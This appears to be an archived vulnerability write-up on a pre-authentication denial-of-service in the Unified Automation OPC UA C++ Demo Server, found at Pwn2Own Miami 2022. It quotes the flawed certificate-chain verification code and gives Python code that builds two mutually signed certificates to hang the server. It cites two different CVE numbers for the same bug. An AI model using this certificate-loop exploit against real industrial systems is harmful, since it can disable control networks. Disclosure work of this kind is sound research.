---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-09-14_pwn2own-miami-2022-unified-automation-c-demo-server-dos.md
original_filename: 2022-09-14_pwn2own-miami-2022-unified-automation-c-demo-server-dos.md
title: 'Pwn2Own Miami 2022: Unified Automation C++ Demo Server DoS'
category: documents
detected_topics:
- command-injection
- automation-abuse
- cloud-security
tags:
- imported
- documents
- command-injection
- automation-abuse
- cloud-security
language: en
raw_sha256: f8d6dd221ae1883b3ec612200f47a8b583b44b102a3f8f9402e0b2ddb35f0489
text_sha256: b6cfa44f356137ffa94d71ca2040025882bd30488cde57a546ded7f79dea2e0f
ingested_at: '2026-06-28T07:32:14Z'
sensitivity: unknown
redactions_applied: false
---

# Pwn2Own Miami 2022: Unified Automation C++ Demo Server DoS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-09-14_pwn2own-miami-2022-unified-automation-c-demo-server-dos.md
- Source Type: markdown
- Detected Topics: command-injection, automation-abuse, cloud-security
- Ingested At: 2026-06-28T07:32:14Z
- Redactions Applied: False
- Raw SHA256: `f8d6dd221ae1883b3ec612200f47a8b583b44b102a3f8f9402e0b2ddb35f0489`
- Text SHA256: `b6cfa44f356137ffa94d71ca2040025882bd30488cde57a546ded7f79dea2e0f`


## Content

---
title: "Pwn2Own Miami 2022: Unified Automation C++ Demo Server DoS"
page_title: "Pwn2Own Miami 2022: Unified Automation C++ Demo Server DoS | DEFION Research Labs"
url: "https://sector7.computest.nl/post/2022-09-unified-automation-opcua-cpp/"
final_url: "https://defion.security/en/research-labs/pwn2own-miami-2022-unified-automation-c-demo-server-dos/"
authors: ["Sector 7 (@sector7_nl)"]
programs: ["Unified Automation"]
bugs: ["DoS"]
bounty: "5,000"
publication_date: "2022-09-14"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2168
---

[Home](/en/) › [Research Labs](/en/research-labs/) › Pwn2Own Miami 2022: Unified Automation C++ Demo Server DoS

Pwn2Own 14 September 2022 · 7 min read

# Pwn2Own Miami 2022: Unified Automation C++ Demo Server DoS

This write-up is part 4 of a series of write-ups about the 5 vulnerabilities we demonstrated last April at Pwn2Own Miami. This is the write-up for a Denial-of-Service in the Unified Automation OPC UA C++ Demo Server (CVE-2022-37013).

> [](https://twitter.com/thezdi/status/1516779254582812680)

OPC UA is a communication protocol used in the ICS world. It is an open standard developed by the OPC Foundation. Because it is implemented by many vendors, it is often the preferred protocol for setting up communication between systems from different vendors in an ICS network.

At Pwn2Own Miami 2022, four OPC UA servers were in scope, with three different "payload" options:

  * **Denial-of-Service.** Availability is everything in an ICS network, so being able to crash an OPC UA server can have significant impact.
  * **Remote code execution.** Being able to take over the server.
  * **Bypass Trusted Application Check.** Setting up a trusted connection to a server without having a valid certificate.

If an client connects with the server it first needs to authenticate using a client certificate. We call this the trusted application check. The protocol also supports user authentication, using either username/password combination or certificates, but this is only after the client application itself has been authenticated. Although OPC UA uses the same X.509 certificates as TLS, the protocol itself is not based on TLS.

For the OPC UA server category we focused on bypassing the trusted application check, as this would gain us the most points. We did not look at remote code execution vulnerabilities. A trusted application means the application can authenticate with a valid certificate. This meant we only had to audit the certificate verification function, which is a very limited scope. We looked at all applications in scope, and in the end did find such a vulnerability in the OPC Foundation OPC UA .NET Standard (you can find the write-up for this vulnerability [here](/en/research-labs/pwn2own-miami-2022-opc-ua-net-standard-trusted-application-check-bypass/)).

In the Unified Automation C++ Demo Server we couldn't find a way to bypass the check, however we did find a reliable Denial-of-Service while reviewing this. Since this Denial-of-Service is in the certificate verification function, it means we can trigger this vulnerability before authentication. In the ICS world where everything revolves around availability, having a vulnerability that allows the attacker to reliably disable a central component is less than ideal.

## Certificate verification

Verifying the certificate for a client is handled by the function `OpcUa_P_OpenSSL_PKI_ValidateCertificate()` in `uastack.dll`. This function will call `OpcUa_P_OpenSSL_CertificateStore_IsExplicitlyTrusted()`, which will check if the certificate or any of its issuers are already explicitly trusted. It will do so by walking the certificate chain and checking each certificate if it is equal to a trusted certificate; meaning its SHA1 hash is equal to that of a file under the `pki/trusted/certs` folder on the server.

The source code for this function seems to be similar to some code from the OPC Foundation, [which can be found on GitHub](https://github.com/OPCFoundation/Misc-Tools/blob/master/CertificateGenerator/platforms/win32/opcua_p_openssl_pki.c#L246):
  
  
  static OpcUa_StatusCode OpcUa_P_OpenSSL_CertificateStore_IsExplicitlyTrusted(
  OpcUa_P_OpenSSL_CertificateStore* a_pStore,
  X509_STORE_CTX* a_pX509Context,
  X509* a_pX509Certificate,
  OpcUa_Boolean* a_pExplicitlyTrusted)
  {
  X509* x = a_pX509Certificate;
  X509* xtmp = OpcUa_Null;
  int iResult = 0;
  OpcUa_UInt32 jj = 0;
  OpcUa_ByteString tBuffer;
  OpcUa_Byte* pPosition = OpcUa_Null;
  OpcUa_P_OpenSSL_CertificateThumbprint tThumbprint;
  
  OpcUa_InitializeStatus(OpcUa_Module_P_OpenSSL, "CertificateStore_IsExplicitlyTrusted");
  
  OpcUa_ReturnErrorIfArgumentNull(a_pStore);
  OpcUa_ReturnErrorIfArgumentNull(a_pX509Context);
  OpcUa_ReturnErrorIfArgumentNull(a_pX509Certificate);
  OpcUa_ReturnErrorIfArgumentNull(a_pExplicitlyTrusted);
  
  OpcUa_P_ByteString_Initialize(&tBuffer);
  
  *a_pExplicitlyTrusted = OpcUa_False;
  
  /* follow the trust chain. */
  while (!*a_pExplicitlyTrusted)
  {
  /* need to convert to DER encoded certificate. */
  int iLength = i2d_X509(x, NULL);
  
  if (iLength > tBuffer.Length)
  {
  tBuffer.Length = iLength;
  tBuffer.Data = OpcUa_P_Memory_ReAlloc(tBuffer.Data, iLength);
  OpcUa_GotoErrorIfAllocFailed(tBuffer.Data);
  }
  
  pPosition = tBuffer.Data;
  iResult = i2d_X509((X509*)x, &pPosition);
  
  if (iResult <= 0)
  {
  OpcUa_GotoErrorWithStatus(OpcUa_BadEncodingError);
  }
  
  /* compute the hash */
  SHA1(tBuffer.Data, iLength, tThumbprint.Data);
  
  /* check for thumbprint in explicit trust list. */
  for (jj = 0; jj < a_pStore->ExplicitTrustListCount; jj++)
  {
  if (OpcUa_MemCmp(a_pStore->ExplicitTrustList[jj].Data, tThumbprint.Data, SHA_DIGEST_LENGTH) == 0)
  {
  *a_pExplicitlyTrusted = OpcUa_True;
  break;
  }
  }
  
  if (*a_pExplicitlyTrusted)
  {
  break;
  }
  
  /* end of chain if self signed. */
  if (X509_STORE_CTX_get_check_issued(a_pX509Context)(a_pX509Context, x, x))
  {
  break;
  }
  
  /* look in the store for the issuer. */
  iResult = X509_STORE_CTX_get_get_issuer(a_pX509Context)(&xtmp, a_pX509Context, x);
  
  if (iResult == 0)
  {
  break;
  }
  
  /* oops - unexpected error */
  if (iResult < 0)
  {
  OpcUa_GotoErrorWithStatus(OpcUa_Bad);
  }
  
  /* goto next link in chain. */
  x = xtmp;
  X509_free(xtmp);
  }
  
  OpcUa_P_ByteString_Clear(&tBuffer);
  
  OpcUa_ReturnStatusCode;
  OpcUa_BeginErrorHandling;
  
  OpcUa_P_ByteString_Clear(&tBuffer);
  
  OpcUa_FinishErrorHandling;
  }

It will check if the SHA1 hash of the certificate is is the known trusted list. If not, it will continue the while loop, by checking if the issuer (obtained using `X509_STORE_CTX_get_get_issuer()`) is on the trusted list instead. This will continue until the entire chain has been checked.

However, what if there is a loop in the chain? In that case the while loop will turn into an infinite loop, as there is always some certificate to check. Since the entire network handling occurs in a single thread in the demo application, this will effectively make the server unresponsive for all clients. Creating a nice and effective Denial-of-Service. A loop of length one is a self-signed certificate, which is checked for (the call to `X509_STORE_CTX_get_check_issued()`), but it is in fact also possible to construct a loop of certificates which is longer.

## Our exploit

Our exploit is simple. First we generate two certificates A and B. Since for signing the certificate you only need the private key, we can sign certificate A with the key of B, and B with the key of A. This will create a certificate chain where both certificate have each other as issuer; and thus creating a loop.
  
  
  def make_cert(name, issuer, public_key, private_key, identifier, issuer_identifier):
  one_day = datetime.timedelta(1, 0, 0)
  
  builder = x509.CertificateBuilder()
  
  builder = builder.subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, name)]))
  
  builder = builder.issuer_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, issuer)]))
  
  builder = builder.not_valid_before(datetime.datetime.today() - (one_day * 7))
  builder = builder.not_valid_after(datetime.datetime.today() + (one_day * 90))
  builder = builder.serial_number(x509.random_serial_number())
  builder = builder.public_key(public_key)
  builder = builder.add_extension(x509.SubjectKeyIdentifier(identifier), critical=False)
  builder = builder.add_extension(x509.AuthorityKeyIdentifier(key_identifier=issuer_identifier, authority_cert_issuer=None, authority_cert_serial_number=None), critical=False)
  builder = builder.add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=False)
  
  # No idea if all of these are needed, but data_encipherment is required.
  builder = builder.add_extension(x509.KeyUsage(digital_signature=True, content_commitment=True, key_encipherment=True, data_encipherment=True,
  key_agreement=True, key_cert_sign=True, crl_sign=True, encipher_only=False, decipher_only=False), critical=False)
  
  # The certificate is actually self-signed, but this doesn't matter because the signature is not checked.
  certificate = builder.sign(private_key=private_key, algorithm=hashes.SHA256(), backend=backend)
  
  return certificate
  
  private_keyA = rsa.generate_private_key(public_exponent=65537, key_size=3072, backend=backend)
  public_keyA = private_keyA.public_key()
  
  private_keyB = rsa.generate_private_key(public_exponent=65537, key_size=3072, backend=backend)
  public_keyB = private_keyB.public_key()
  
  certA = make_cert("A", "B", public_keyA, private_keyB, b"1", b"2")
  certB = make_cert("B", "A", public_keyB, private_keyA, b"2", b"1")

By trying to authenticate at the server using this certificate and including the other as an additional certificate, we can see that eventually we reach a timeout and the server will spin at 100% CPU usage.

You can see the exploit in action in the screen recording below.

Your browser does not support the video tag. 

## Conclusion

OPC UA is often a central component between the IT and OT network of an organisation. Being able to reliably shut it down pre-authentication is a powerful primitive to have. This vulnerability shows yet again that validating certificates is an error prone operation, that should be handled with care.

This issue was fixed in version v1.7.7-549 and was given the CVE number CVE-2022-29862. Unified-Automation now uses the certificate stack that was constructed by OpenSSL for validation.

We thank Zero Day Initiative for organizing this years edition of Pwn2Own Miami, we hope to return to a later edition!

You can find the other four write-ups here:

  * [OPC UA .NET Standard Trusted Application Check Bypass](/en/research-labs/pwn2own-miami-2022-opc-ua-net-standard-trusted-application-check-bypass/)
  * [Inductive Automation Remote Code Execution](/en/research-labs/pwn2own-miami-2022-inductive-automation-ignition-remote-code-execution/)
  * [AVEVA Edge Arbitrary Code Execution](/en/research-labs/pwn2own-miami-2022-aveva-edge-arbitrary-code-execution/)
  * [ICONICS GENESIS64 Arbitrary Code Execution](/en/research-labs/pwn2own-miami-2022-iconics-genesis64-arbitrary-code-execution/)

From our research desk to your environment

The offensive expertise behind this research is the same expertise that tests your own systems. Find the vulnerabilities that matter before attackers do. 

[Red Teaming →](/en/pentesting-services/red-teaming-service/)

[← Back to Research Labs](/en/research-labs/)
